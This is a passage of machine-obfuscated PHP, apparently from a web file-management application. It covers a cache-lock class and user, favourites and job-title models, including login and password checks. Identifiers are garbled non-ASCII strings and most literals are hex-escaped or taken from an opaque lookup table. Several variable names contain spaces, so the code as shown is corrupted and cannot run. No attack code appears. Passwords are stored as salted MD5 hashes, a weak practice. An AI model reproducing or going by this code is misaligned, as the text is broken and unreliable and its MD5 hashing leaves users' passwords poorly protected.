$timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $•àŒşîÍ =& $_SERVER[§ŒØóıü]; if (self::$handle) { return self::$handle; } $·úùŞ£û = $GLOBALS[$•àŒşîÍ[6]][$•àŒşîÍ[349]]; self::$timeout = $·úùŞ£û[$•àŒşîÍ[846]] ? $·úùŞ£û[$•àŒşîÍ[846]] : 10; $×Å‚Ä = _get($GLOBALS[$•àŒşîÍ[6]], $•àŒşîÍ[847]); $Âù˜şÄ’ = $·úùŞ£û[$•àŒşîÍ[833]] ? $·úùŞ£û[$•àŒşîÍ[833]] : $•àŒşîÍ[200]; if ($Âù˜şÄ’ == $•àŒşîÍ[21] && $×Å‚Ä == $•àŒşîÍ[13]) { $Âù˜şÄ’ = $•àŒşîÍ[200]; } switch ($Âù˜şÄ’) { case $•àŒşîÍ[836]: self::$handle = new CacheLockRedis(); break; case $•àŒşîÍ[837]: self::$handle = new CacheLockMemcached(); break; case $•àŒşîÍ[21]: self::$handle = new CacheLockDatabase(); break; case $•àŒşîÍ[200]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($•àŒşîÍ[848], $•àŒşîÍ[849]); } return self::$handle; } private static function key($Â¬šÚû) { return $_SERVER[§ŒØóıü][850] . Cache::key($Â¬šÚû); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($®û²ôı = '') { self::$errorMsg = $®û²ôı; } public static function lockGlobal($‰±åĞ±, $á…ï·”Ù) { return self::lock($‰±åĞ±, $á…ï·”Ù, !0); } public static function lock($½±ÊÃğº, $—¯ËÁ« = false, $¸¼”´Ùğ = false) { $­ü³Œ•’ =& $_SERVER[§ŒØóıü]; $´³££Ø = self::init(); $î›¯ÓØã = self::key($½±ÊÃğº); $—¯ËÁ« = $—¯ËÁ« ? $—¯ËÁ« : self::$timeout; $ì«šÚ = timeFloat(); $î‚‚èï = $´³££Ø->lock($î›¯ÓØã, $—¯ËÁ«); $¦Æşí¦ü = timeFloat(); if (!$î‚‚èï) { $£ö…—¯ = "\x6c\x6f\x63\x6b\x20\145\162\x72\x6f\162\x3b\153\x65\171\75{$½±ÊÃğº}\73\164\151\x6d\145\x3d{$—¯ËÁ«}\73" . self::$errorMsg . $­ü³Œ•’[71] . get_caller_msg(); $­«¾ä• = LNG($­ü³Œ•’[851]) . "\x28{$—¯ËÁ«}\163\51\x2e" . LNG($­ü³Œ•’[852]); $­«¾ä• .= $­ü³Œ•’[853]; if (is_string(self::$errorMsg) && self::$errorMsg) { $­«¾ä• = $­«¾ä• . $­ü³Œ•’[854] . self::$errorMsg; } write_log($­ü³Œ•’[855] . sprintf($­ü³Œ•’[856], timeFloat() - $ì«šÚ) . $­ü³Œ•’[857] . $£ö…—¯ . $­ü³Œ•’[858] . error_get_last(), $­ü³Œ•’[849]); show_json($­«¾ä•, !1); } if (!$¸¼”´Ùğ) { self::$lockItem[$î›¯ÓØã] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $œÚÎ™®ª = number_format(timeFloat() - $¦Æşí¦ü, 3); write_log($­ü³Œ•’[859] . $½±ÊÃğº . $­ü³Œ•’[860] . $œÚÎ™®ª, $­ü³Œ•’[849]); } return $î‚‚èï; } public static function lockGet($¤àùÉší) { $íà£æûÔ = self::key($¤àùÉší); if (self::$lockItem[$íà£æûÔ]) { return self::$lockItem[$íà£æûÔ]; } return self::init()->lockGet($íà£æûÔ); } public static function unlock($û’–º†¯) { $‘…ÓÄÔØ =& $_SERVER[§ŒØóıü]; $•ƒ÷¬ÈÔ = self::key($û’–º†¯); self::$lockItem[$•ƒ÷¬ÈÔ] = null; self::init()->unlock($•ƒ÷¬ÈÔ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($‘…ÓÄÔØ[861] . $û’–º†¯, $‘…ÓÄÔØ[849]); } return; } public static function unlockRuntime() { $¯¯º²¤© =& $_SERVER[§ŒØóıü]; $­—Ôûêí = self::init(); $öì£¹êÈ = !1; foreach (self::$lockItem as $×’²£¼ => $Âğ»ÖÈÑ) { if (!$Âğ»ÖÈÑ) { continue; } $­—Ôûêí->unlock($×’²£¼); if (!$öì£¹êÈ) { $öì£¹êÈ = !0; write_log($¯¯º²¤©[862] . $×’²£¼ . $¯¯º²¤©[71] . get_caller_msg(), $¯¯º²¤©[849]); continue; } write_log($¯¯º²¤©[862] . $×’²£¼, $¯¯º²¤©[849]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $‰Èå™š’ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¯¯º²¤©[863] . $‰Èå™š’ . $¯¯º²¤©[864] . ACTION, $¯¯º²¤©[849]); } } public static function fileLock($­Ûã«İÜ) { $ÀºŸ©à• =& $_SERVER[§ŒØóıü]; if (!$GLOBALS[$ÀºŸ©à•[865]]) { $GLOBALS[$ÀºŸ©à•[865]] = array(); } $GLOBALS[$ÀºŸ©à•[865]][$­Ûã«İÜ] = !1; $ı¬ÅÆŠñ = fopen(DATA_PATH . $­Ûã«İÜ . $ÀºŸ©à•[866], $ÀºŸ©à•[867]); if (!$ı¬ÅÆŠñ) { return !1; } $GLOBALS[$ÀºŸ©à•[865]][$­Ûã«İÜ] = $ı¬ÅÆŠñ; if (flock($ı¬ÅÆŠñ, LOCK_EX)) { return !0; } self::unlock($­Ûã«İÜ); show_json($ÀºŸ©à•[868], !1); return !1; } public static function fileUnlock($À£æ©ç) { $ğœĞòŞ =& $_SERVER[§ŒØóıü]; $Éüñ±şò = $GLOBALS[$ğœĞòŞ[865]][$À£æ©ç]; if (!$Éüñ±şò) { return; } $GLOBALS[$ğœĞòŞ[865]][$À£æ©ç] = !1; flock($Éüñ±şò, LOCK_UN); fclose($Éüñ±şò); } public static function fileUnlockAll() { $›¡üô¬“ =& $_SERVER[§ŒØóıü]; if (!$GLOBALS[$›¡üô¬“[865]]) { return; } foreach ($GLOBALS[$›¡üô¬“[865]] as $¦’ªĞÇ© => $‰”â¦×Ô) { if (!$‰”â¦×Ô) { continue; } $GLOBALS[$›¡üô¬“[865]][$¦’ªĞÇ©] = !1; flock($‰”â¦×Ô, LOCK_UN); fclose($‰”â¦×Ô); } $GLOBALS[$›¡üô¬“[865]] = array(); } } goto B¤ó•‹¬Â; CÀœë–òÄ: class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($ïù‘šÍ¶) { $ÉÛ—Ó’Ï =& $_SERVER[§ŒØóıü]; return array($ÉÛ—Ó’Ï[1973] => array(USER_ID, $ÉÛ—Ó’Ï[2306])); } protected function listData() { $Ëöƒ»€ =& $_SERVER[§ŒØóıü]; $ö˜ÛÓˆ¼ = array($Ëöƒ»€[1664] => USER_ID, $Ëöƒ»€[483] => 0); $€à•¥Ú = $Ëöƒ»€[2307]; $ÆÆÙœŞÈ = $this->field($€à•¥Ú)->where($ö˜ÛÓˆ¼)->order($Ëöƒ»€[2308])->select(); return $ÆÆÙœŞÈ ? $ÆÆÙœŞÈ : array(); } protected function resetCache() { } protected function listView() { $Êè™çé¥ =& $_SERVER[§ŒØóıü]; $ÂµÈş±İ = $this->listData(); $ëáÙ¦åÙ = array_filter_by_field($ÂµÈş±İ, $Êè™çé¥[33], $Êè™çé¥[416]); $´¹•©³ = array_to_keyvalue($ëáÙ¦åÙ, $Êè™çé¥[12], $Êè™çé¥[84]); if (!$´¹•©³) { return $ÂµÈş±İ; } $Õ¡£®éä = 2000; $¬¦ñ¨‹ä = array($Êè™çé¥[417] => array($Êè™çé¥[418], $´¹•©³)); $áŸŞÜã = Model($Êè™çé¥[831])->listSource($¬¦ñ¨‹ä, $Õ¡£®éä); $áŸŞÜã = array_merge($áŸŞÜã[$Êè™çé¥[83]], $áŸŞÜã[$Êè™çé¥[82]]); $áŸŞÜã = array_to_keyvalue($áŸŞÜã, $Êè™çé¥[402]); foreach ($ÂµÈş±İ as $Ü¿öÕ²ı => $åÂ«€İ¾) { $œ·üöš = $áŸŞÜã[$åÂ«€İ¾[$Êè™çé¥[84]]]; $œ·üöš = $œ·üöš ? $œ·üöš : array(); $ÂµÈş±İ[$Ü¿öÕ²ı] = array_merge($œ·üöš, $åÂ«€İ¾); } return $ÂµÈş±İ; } protected function addFav($õÜáá, $æãŒâÔ³ = '', $êĞ®ğ¹ = "\x73\x6f\165\x72\143\145") { $Ç¢ÅÓï… =& $_SERVER[§ŒØóıü]; $¯’§ä¼ = array($Ç¢ÅÓï…[1664] => USER_ID, $Ç¢ÅÓï…[483] => 0, $Ç¢ÅÓï…[422] => $êĞ®ğ¹, $Ç¢ÅÓï…[421] => $õÜáá); if ($this->where($¯’§ä¼)->find()) { return !1; } $¯’§ä¼ = array($Ç¢ÅÓï…[1664] => USER_ID, $Ç¢ÅÓï…[483] => 0); $ÒÖŠŞÈŞ = $this->where($¯’§ä¼)->max($Ç¢ÅÓï…[1886]); if (!$ÒÖŠŞÈŞ) { $ÒÖŠŞÈŞ = 0; } if (!$æãŒâÔ³ && $êĞ®ğ¹ == $Ç¢ÅÓï…[416]) { $™Í¦‹ó¢ = Model($Ç¢ÅÓï…[1345])->where(array($Ç¢ÅÓï…[417] => $õÜáá))->find(); if (!$™Í¦‹ó¢) { return !1; } $æãŒâÔ³ = $™Í¦‹ó¢[$Ç¢ÅÓï…[32]]; } $æãŒâÔ³ = $this->getAutoName($æãŒâÔ³); $œÊÑû¡ = array($Ç¢ÅÓï…[1664] => USER_ID, $Ç¢ÅÓï…[483] => 0, $Ç¢ÅÓï…[420] => $æãŒâÔ³, $Ç¢ÅÓï…[421] => $õÜáá, $Ç¢ÅÓï…[422] => $êĞ®ğ¹, $Ç¢ÅÓï…[1866] => $ÒÖŠŞÈŞ + 1); return $this->add($œÊÑû¡); } protected function remove($½ñ‹š›) { $ğ²Ñêó =& $_SERVER[§ŒØóıü]; $ÔÜÛÈ = array($ğ²Ñêó[1664] => USER_ID, $ğ²Ñêó[419] => $½ñ‹š›); return $this->where($ÔÜÛÈ)->delete(); } protected function removeByName($óîÕé–¢) { $¿¥Ë»¯º =& $_SERVER[§ŒØóıü]; $±ÆŠ­ÃØ = array($¿¥Ë»¯º[1664] => USER_ID, $¿¥Ë»¯º[420] => $óîÕé–¢, $¿¥Ë»¯º[483] => 0); return $this->where($±ÆŠ­ÃØ)->delete(); } protected function rename($ğóÔÛˆ‚, $ç™ëØ°æ) { $ÜÛˆÏÍü =& $_SERVER[§ŒØóıü]; if ($ğóÔÛˆ‚ == $ç™ëØ°æ) { return !1; } $ò†òëƒç = $this->getAutoName($ç™ëØ°æ); if ($ç™ëØ°æ != $ò†òëƒç) { return !1; } $ÇÃï‚­ = array($ÜÛˆÏÍü[1664] => USER_ID, $ÜÛˆÏÍü[483] => 0, $ÜÛˆÏÍü[32] => $ğóÔÛˆ‚); return $this->where($ÇÃï‚­)->save(array($ÜÛˆÏÍü[32] => $ç™ëØ°æ)); } protected function resetSort($¥ïÍ†ùœ) { $ğ§²“ºç =& $_SERVER[§ŒØóıü]; $¥ïÍ†ùœ = is_array($¥ïÍ†ùœ) ? $¥ïÍ†ùœ : array(); $™Æ¸öÁ = array($ğ§²“ºç[1664] => USER_ID); for ($²”Å¨ ş = 0; $²”Å¨ ş < count($¥ïÍ†ùœ); $²”Å¨ ş++) { $™Æ¸öÁ[$ğ§²“ºç[419]] = $¥ïÍ†ùœ[$²”Å¨ ş]; $this->where($™Æ¸öÁ)->save(array($ğ§²“ºç[1866] => $²”Å¨ ş + 1)); } return !0; } protected function moveTop($™ÄÜ‚ùµ) { $Ëã¿Ô‰ =& $_SERVER[§ŒØóıü]; $˜–ï­® = array($Ëã¿Ô‰[1664] => USER_ID, $Ëã¿Ô‰[483] => 0); $Ö±ŒŸúã = $this->where($˜–ï­®)->where(array($Ëã¿Ô‰[32] => $™ÄÜ‚ùµ))->find(); if (!$Ö±ŒŸúã) { return; } $ ™»ï = $this->field($Ëã¿Ô‰[399])->where($˜–ï­®)->order($Ëã¿Ô‰[2308])->select(); $ ™»ï = array_to_keyvalue($ ™»ï, $Ëã¿Ô‰[12], $Ëã¿Ô‰[399]); $ÃŸ’†ØŠ = $ ™»ï; $ ™»ï = array_remove_value($ ™»ï, $Ö±ŒŸúã[$Ëã¿Ô‰[399]]); array_unshift($ ™»ï, $Ö±ŒŸúã[$Ëã¿Ô‰[399]]); return $this->resetSort($ ™»ï); } protected function moveBottom($ëÌğ¸É) { $ÅãôÈ­ =& $_SERVER[§ŒØóıü]; $ˆ¿¶ÈüÍ = array($ÅãôÈ­[1664] => USER_ID, $ÅãôÈ­[483] => 0); $í—êÑÑû = $this->where($ˆ¿¶ÈüÍ)->max($ÅãôÈ­[1886]); $ûƒ´™ = array($ÅãôÈ­[1886] => $í—êÑÑû + 1); return $this->where($ˆ¿¶ÈüÍ)->where(array($ÅãôÈ­[32] => $ëÌğ¸É))->save($ûƒ´™); } private function getAutoName($ÓÖ¨Š´¬) { $ü•úöğ¿ =& $_SERVER[§ŒØóıü]; $©ì¹æ± = array($ü•úöğ¿[1664] => USER_ID, $ü•úöğ¿[483] => 0); $Ú…·ú—ò = $this->field($ü•úöğ¿[32])->where($©ì¹æ±)->select(); $Ú…·ú—ò = array_to_keyvalue($Ú…·ú—ò, $ü•úöğ¿[12], $ü•úöğ¿[32]); if (!$Ú…·ú—ò || !in_array($ÓÖ¨Š´¬, $Ú…·ú—ò)) { return $ÓÖ¨Š´¬; } for ($±øˆ¾Ò™ = 0; $±øˆ¾Ò™ < count($Ú…·ú—ò); $±øˆ¾Ò™++) { if (!in_array($ÓÖ¨Š´¬ . "\x28{$±øˆ¾Ò™}\51", $Ú…·ú—ò)) { return $ÓÖ¨Š´¬ . "\50{$±øˆ¾Ò™}\51"; } } return $ÓÖ¨Š´¬ . "\50{$±øˆ¾Ò™}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\56\152\157\142\114\x69\163\x74"; public $field = array("\156\141\155\145", "\x64\x65\x73\143", "\163\157\162\164"); const JOB_KEY = "\163\145\154\146\112\x6f\142\x4c\151\x73\164"; public function listData($•‚ŸæıÂ = false, $×È—Ó = "\x73\x6f\162\164", $ÜñêúÄ‰ = false) { return parent::listData($•‚ŸæıÂ, $×È—Ó, $ÜñêúÄ‰); } public function remove($ªôªñş) { return parent::remove($ªôªñş); } public function add($ßƒÆ‚é) { $æú‹ç¤ =& $_SERVER[§ŒØóıü]; if ($this->findByName($ßƒÆ‚é[$æú‹ç¤[32]])) { return !1; } $ßƒÆ‚é[$æú‹ç¤[1886]] = $this->getSort(); return parent::insert($ßƒÆ‚é); } private function getSort() { $„ÕÓÎ˜Ö =& $_SERVER[§ŒØóıü]; $«Æ•øšı = parent::listData(); $ö²ŸŠò» = array_to_keyvalue($«Æ•øšı, $„ÕÓÎ˜Ö[12], $„ÕÓÎ˜Ö[1886]); return empty($ö²ŸŠò») ? 0 : max($ö²ŸŠò») + 1; } public function update($å¯é÷âŞ, $£‹êË¿İ) { $ƒ©Ç“© =& $_SERVER[§ŒØóıü]; $ïÏŒª§˜ = parent::listData($å¯é÷âŞ); $Î€‘Ê = $this->findByName($£‹êË¿İ[$ƒ©Ç“©[32]]); if (!$ïÏŒª§˜ || $Î€‘Ê && $Î€‘Ê[$ƒ©Ç“©[399]] != $ïÏŒª§˜[$ƒ©Ç“©[399]]) { return !1; } return parent::update($å¯é÷âŞ, $£‹êË¿İ); } public function setUserJob($ª’ÈêëÔ, $»™Ïˆ‘‡) { $Ùµ¬ßáÀ =& $_SERVER[§ŒØóıü]; if (!is_array($»™Ïˆ‘‡)) { $»™Ïˆ‘‡ = array($»™Ïˆ‘‡); } $£ŞÃ¢Ê½ = parent::listData(); $Ë¹Ô‰ùù = array_to_keyvalue($£ŞÃ¢Ê½, $Ùµ¬ßáÀ[32]); $Î¢şºËÍ = $Ùµ¬ßáÀ[378]; foreach ($»™Ïˆ‘‡ as $†íöŒÂ) { if ($Ë¹Ô‰ùù[$†íöŒÂ]) { $Î¢şºËÍ .= $Ë¹Ô‰ùù[$†íöŒÂ][$Ùµ¬ßáÀ[399]] . $Ùµ¬ßáÀ[50]; } else { $ÒÂáˆ–ë = $this->add($†íöŒÂ); $Î¢şºËÍ .= $ÒÂáˆ–ë . $Ùµ¬ßáÀ[50]; } } $Î¢şºËÍ = rtrim($Î¢şºËÍ, $Ùµ¬ßáÀ[50]); Model($Ùµ¬ßáÀ[525])->metaSet($ª’ÈêëÔ, self::JOB_KEY, $Î¢şºËÍ); } public function getUserJob($‚š…‡Îì) { $ö¦Êëí“ = Model($_SERVER[§ŒØóıü][525])->metaGet($‚š…‡Îì); return $this->getUserJobInfo($ö¦Êëí“[self::JOB_KEY]); } public function getUserJobInfo($³…©×ø÷) { $ãœÑÕå¦ =& $_SERVER[§ŒØóıü]; $šâ€ÈàÍ = explode($ãœÑÕå¦[50], $³…©×ø÷); $¯öÉŞŞ = parent::listData(); $¯öÉŞŞ = array_remove_key($¯öÉŞŞ, $ãœÑÕå¦[201]); $¾ª™“ÖÙ = array(); foreach ($šâ€ÈàÍ as $ûÚõŞı) { if (isset($¯öÉŞŞ[$ûÚõŞı])) { $¾ª™“ÖÙ[] = $¯öÉŞŞ[$ûÚõŞı]; } } return $¾ª™“ÖÙ; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\x61\x6d\x65" => "\x75\x73\x65\162\x5f\155\x65\x74\141", "\155\x65\164\141\x46\151\145\154\x64" => "\165\163\x65\x72\x49\x44"); protected $simpleField = "\x75\163\145\162\x49\x44\x2c\156\x69\143\153\116\141\155\145\x2c\x6e\x61\155\x65\x2c\x61\x76\141\164\141\162\x2c\x73\145\x78\54\x73\164\x61\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¹¬ƒõÜä) { $Î²êî‡é =& $_SERVER[§ŒØóıü]; $É›©Œƒ = $Î²êî‡é[2309]; return array($Î²êî‡é[1940] => array($¹¬ƒõÜä[0], $É›©Œƒ), $Î²êî‡é[1942] => array($¹¬ƒõÜä[0], $É›©Œƒ), $Î²êî‡é[2310] => array($¹¬ƒõÜä[0], $É›©Œƒ)); } protected function getInfo($”ˆìíÈ˜, $®°âˆÕ« = false) { $Àğ½¼ÙĞ = $this->getInfoSimple($”ˆìíÈ˜); if (!is_array($Àğ½¼ÙĞ)) { return array(); } if ($®°âˆÕ«) { return $this->_getInfoApply($Àğ½¼ÙĞ); } return $this->cacheFunctionGet($_SERVER[§ŒØóıü][1944], $”ˆìíÈ˜); } protected function getInfoFull($õî®èïÊ, $æ›è†Èš = false) { $Áè‰ç¢ = $this->getInfoSimple($õî®èïÊ); if (!is_array($Áè‰ç¢)) { return array(); } if ($æ›è†Èš) { return $this->_getInfoApply($Áè‰ç¢, !0); } return $this->cacheFunctionGet($_SERVER[§ŒØóıü][2311], $õî®èïÊ); } private function _getInfoApply($ãÆŒ›ş», $ƒ•óòµÏ = false) { $ôâææû =& $_SERVER[§ŒØóıü]; if (!$ãÆŒ›ş») { return $ãÆŒ›ş»; } $âè›ôÛì = md5($ôâææû[2312] . $ãÆŒ›ş»[$ôâææû[895]] . $ôâææû[2313] . $ãÆŒ›ş»[$ôâææû[32]]); $ãÆŒ›ş» = $this->_listDataApplyItem($ãÆŒ›ş»); $Ä“¼’¢ = Model($ôâææû[1345])->metaGet($ãÆŒ›ş»[$ôâææû[87]][$ôâææû[402]]); $ãÆŒ›ş»[$ôâææû[2314]] = $âè›ôÛì; $ãÆŒ›ş»[$ôâææû[87]][$ôâææû[2135]] = isset($Ä“¼’¢[$ôâææû[2136]]) ? $Ä“¼’¢[$ôâææû[2136]] : null; if ($ƒ•óòµÏ) { $ãÆŒ›ş»[$ôâææû[466]] = $this->metaGet($ãÆŒ›ş»[$ôâææû[1673]]); } return $ãÆŒ›ş»; } protected function getInfoSimple($öşŞºáÆ, $ÍŞ‰±æè = false) { $¦ıÉ¹·² =& $_SERVER[§ŒØóıü]; if (!$öşŞºáÆ) { return array(); } if ($ÍŞ‰±æè) { $ëƒ¡±ü¹ = $this->where(array($¦ıÉ¹·²[1673] => intval($öşŞºáÆ)))->find(); if (!is_array($ëƒ¡±ü¹)) { return array(); } $ëƒ¡±ü¹[$¦ıÉ¹·²[533]] = Action($¦ıÉ¹·²[2315])->parseUrl($ëƒ¡±ü¹[$¦ıÉ¹·²[533]]); return $ëƒ¡±ü¹; } return $this->cacheFunctionGet($¦ıÉ¹·²[1945], $öşŞºáÆ); } protected function getInfoSimpleOuter($±Šæ„İÁ) { $£Ş¡àş =& $_SERVER[§ŒØóıü]; if (!$±Šæ„İÁ || $±Šæ„İÁ == 0) { return array($£Ş¡àş[1673] => $£Ş¡àş[198], $£Ş¡àş[32] => $£Ş¡àş[162] . LNG($£Ş¡àş[2316]) . $£Ş¡àş[164], $£Ş¡àş[533] => STATIC_PATH . $£Ş¡àş[2317]); } $²«ÊÜÙø = $this->cacheFunctionGet($£Ş¡àş[1945], $±Šæ„İÁ); $ıöÂ”ƒ = array_field_key($²«ÊÜÙø, explode($£Ş¡àş[50], $this->simpleField)); if (!$ıöÂ”ƒ) { return array($£Ş¡àş[1673] => $£Ş¡àş[1194], $£Ş¡àş[32] => $£Ş¡àş[162] . LNG($£Ş¡àş[2318]) . $£Ş¡àş[164], $£Ş¡àş[533] => STATIC_PATH . $£Ş¡àş[2319]); } $ıöÂ”ƒ[$£Ş¡àş[533]] = Action($£Ş¡àş[2315])->parseUrl($ıöÂ”ƒ[$£Ş¡àş[533]]); return $ıöÂ”ƒ; } protected function groupUser($«ÚåÔ—) { } public static function errorLang($ø²€Š‚Â) { $¿éÎÁÍœ =& $_SERVER[§ŒØóıü]; $¼«Ş†ø‡ = array(self::ERROR_USER_NOT_EXISTS => $¿éÎÁÍœ[2320], self::ERROR_USER_PASSWORD_ERROR => $¿éÎÁÍœ[2321], self::ERROR_USER_EXIST_NAME => $¿éÎÁÍœ[2322], self::ERROR_USER_EXIST_PHONE => $¿éÎÁÍœ[2323], self::ERROR_USER_EXIST_EMAIL => $¿éÎÁÍœ[2324], self::ERROR_USER_LOGIN_LOCK => $¿éÎÁÍœ[2325], self::ERROR_IP_NOT_ALLOW => $¿éÎÁÍœ[2326], self::ERROR_USER_EXIST_NICKNAME => $¿éÎÁÍœ[2327]); return LNG($¼«Ş†ø‡[$ø²€Š‚Â]); } public function getInfoByMeta($÷Š§Ö±î, $èé²óáı) { $Š¼ÒıØÔ =& $_SERVER[§ŒØóıü]; $¾¿Š†È³ = Model($Š¼ÒıØÔ[2328])->where(array($Š¼ÒıØÔ[94] => $÷Š§Ö±î, $Š¼ÒıØÔ[374] => $èé²óáı))->find(); if ($¾¿Š†È³) { return $this->getInfo($¾¿Š†È³[$Š¼ÒıØÔ[1673]]); } return !1; } public function userLoginCheck($ùŠ©Î§É, $«»òû¥¾) { $ ‚¥¦™ª =& $_SERVER[§ŒØóıü]; $èòşªÚÅ = $this->userLoginFind($ùŠ©Î§É); if (!$èòşªÚÅ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($èòşªÚÅ[$ ‚¥¦™ª[1673]], $«»òû¥¾)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($èòşªÚÅ[$ ‚¥¦™ª[1673]]); } public function userLoginFind($¯–…ñ‚Š) { $™’óÃ°Ò =& $_SERVER[§ŒØóıü]; $½ ¼ôİş = array($™’óÃ°Ò[32] => $¯–…ñ‚Š, $™’óÃ°Ò[532] => $¯–…ñ‚Š, $™’óÃ°Ò[305] => $¯–…ñ‚Š, $™’óÃ°Ò[2329] => $¯–…ñ‚Š, $™’óÃ°Ò[1006] => $™’óÃ°Ò[1008]); if ($this->nickNameRpt()) { unset($½ ¼ôİş[$™’óÃ°Ò[532]]); } return $this->where($½ ¼ôİş)->find(); } public function clearCache($•ŠŞÇñ) { $¤å­áçº =& $_SERVER[§ŒØóıü]; $this->cacheFunctionClear($¤å­áçº[1944], $•ŠŞÇñ); $this->cacheFunctionClear($¤å­áçº[1945], $•ŠŞÇñ); $this->cacheFunctionClear($¤å­áçº[2311], $•ŠŞÇñ); } public function userPasswordCheck($ÜÎúÙá‹, $“¦Ôëï¹) { $™ë•ô¬ =& $_SERVER[§ŒØóıü]; $ËÑ¨×Â = $this->where(array($™ë•ô¬[1673] => intval($ÜÎúÙá‹)))->find(); $ßıø³Èá = $this->metaGet($ÜÎúÙá‹); $‘‘Ä©ç“ = isset($ßıø³Èá[$™ë•ô¬[2330]]) ? $ßıø³Èá[$™ë•ô¬[2330]] : $™ë•ô¬[12]; if (md5($‘‘Ä©ç“ . trim($“¦Ôëï¹)) !== $ËÑ¨×Â[$™ë•ô¬[895]]) { return !1; } return !0; } public function userAdd($ÃøÚÌÜÇ) { $µ½òµ’ö =& $_SERVER[§ŒØóıü]; $ŒÈøÛÌÑ = array($µ½òµ’ö[420] => $ÃøÚÌÜÇ[$µ½òµ’ö[32]], $µ½òµ’ö[2331] => $ÃøÚÌÜÇ[$µ½òµ’ö[1554]], $µ½òµ’ö[2332] => isset($ÃøÚÌÜÇ[$µ½òµ’ö[305]]) ? $ÃøÚÌÜÇ[$µ½òµ’ö[305]] : $µ½òµ’ö[12], $µ½òµ’ö[2333] => isset($ÃøÚÌÜÇ[$µ½òµ’ö[2329]]) ? $ÃøÚÌÜÇ[$µ½òµ’ö[2329]] : $µ½òµ’ö[12], $µ½òµ’ö[2334] => isset($ÃøÚÌÜÇ[$µ½òµ’ö[532]]) ? $ÃøÚÌÜÇ[$µ½òµ’ö[532]] : $ÃøÚÌÜÇ[$µ½òµ’ö[32]], $µ½òµ’ö[2335] => isset($ÃøÚÌÜÇ[$µ½òµ’ö[533]]) ? $ÃøÚÌÜÇ[$µ½òµ’ö[533]] : $µ½òµ’ö[12], $µ½òµ’ö[2336] => isset($ÃøÚÌÜÇ[$µ½òµ’ö[2337]]) ? $ÃøÚÌÜÇ[$µ½òµ’ö[2337]] : 1, $µ½òµ’ö[2338] => $ÃøÚÌÜÇ[$µ½òµ’ö[895]], $µ½òµ’ö[1946] => isset($ÃøÚÌÜÇ[$µ½òµ’ö[1849]]) ? $ÃøÚÌÜÇ[$µ½òµ’ö[1849]] : 1024 * 1024 * 20, $µ½òµ’ö[1947] => 0, $µ½òµ’ö[2339] => 0, $µ½òµ’ö[1991] => isset($ÃøÚÌÜÇ[$µ½òµ’ö[755]]) ? $ÃøÚÌÜÇ[$µ½òµ’ö[755]] : 1); if (!empty($ÃøÚÌÜÇ[$µ½òµ’ö[1673]])) { $ŒÈøÛÌÑ[$µ½òµ’ö[1673]] = $ÃøÚÌÜÇ[$µ½òµ’ö[1673]]; } $¡â—’İÁ = $this->_checkExist($ÃøÚÌÜÇ); if ($¡â—’İÁ !== !0) { return $¡â—’İÁ; } if (!empty($ŒÈøÛÌÑ[$µ½òµ’ö[533]]) && strlen($ŒÈøÛÌÑ[$µ½òµ’ö[533]]) > 255) { $ŒÈøÛÌÑ[$µ½òµ’ö[533]] = $µ½òµ’ö[12]; } $Ö™Ï–¸Ì = $this->add($ŒÈøÛÌÑ); $›®òÑ¯ = array($µ½òµ’ö[2338] => $ŒÈøÛÌÑ[$µ½òµ’ö[895]], $µ½òµ’ö[2334] => $ŒÈøÛÌÑ[$µ½òµ’ö[532]]); $this->userEdit($Ö™Ï–¸Ì, $›®òÑ¯); Model($µ½òµ’ö[1345])->userRootAdd($Ö™Ï–¸Ì); return $Ö™Ï–¸Ì; } protected function userEditTest($Ì¢Ö«Çœ, $ªà«Œßû) { return $this->call($_SERVER[§ŒØóıü][2340], $Ì¢Ö«Çœ, $ªà«Œßû); } protected function userEdit($„†ˆ•Ë™, $İıŞê) { $ó³µó– =& $_SERVER[§ŒØóıü]; $ì±ñÒ¢â = $this->getInfoSimple($„†ˆ•Ë™); if (!$ì±ñÒ¢â) { return !1; } $–×ˆüÓÙ = $this->_checkExist($İıŞê, $„†ˆ•Ë™); if ($–×ˆüÓÙ !== !0) { return $–×ˆüÓÙ; } if (isset($İıŞê[$ó³µó–[895]]) && trim($İıŞê[$ó³µó–[895]]) != $ó³µó–[12]) { $¬ìŒëê€ = $this->metaGet($„†ˆ•Ë™); if (empty($¬ìŒëê€[$ó³µó–[2330]])) { $¬ìŒëê€[$ó³µó–[2330]] = rand_string(10); Model($ó³µó–[504])->metaSet($„†ˆ•Ë™, $ó³µó–[2330], $¬ìŒëê€[$ó³µó–[2330]]); } $İıŞê[$ó³µó–[895]] = md5($¬ìŒëê€[$ó³µó–[2330]] . trim($İıŞê[$ó³µó–[895]])); } else { unset($İıŞê[$ó³µó–[895]]); } if (!empty($İıŞê[$ó³µó–[533]]) && strlen($İıŞê[$ó³µó–[533]]) > 255) { $İıŞê[$ó³µó–[533]] = $ó³µó–[12]; } $this->where(array($ó³µó–[1664] => $„†ˆ•Ë™))->save($İıŞê); if (isset($İıŞê[$ó³µó–[532]])) { $this->setNamePinyin($„†ˆ•Ë™, $İıŞê[$ó³µó–[532]]); } $this->clearCache($„†ˆ•Ë™); return !0; } public function setNamePinyin($â£ôŠ‡Ì, $ÁÉŞÙò = false) { $ÑË’è±¢ =& $_SERVER[§ŒØóıü]; if (!$ÁÉŞÙò) { $çÚ÷ƒÁ = $this->getInfoSimple($â£ôŠ‡Ì); 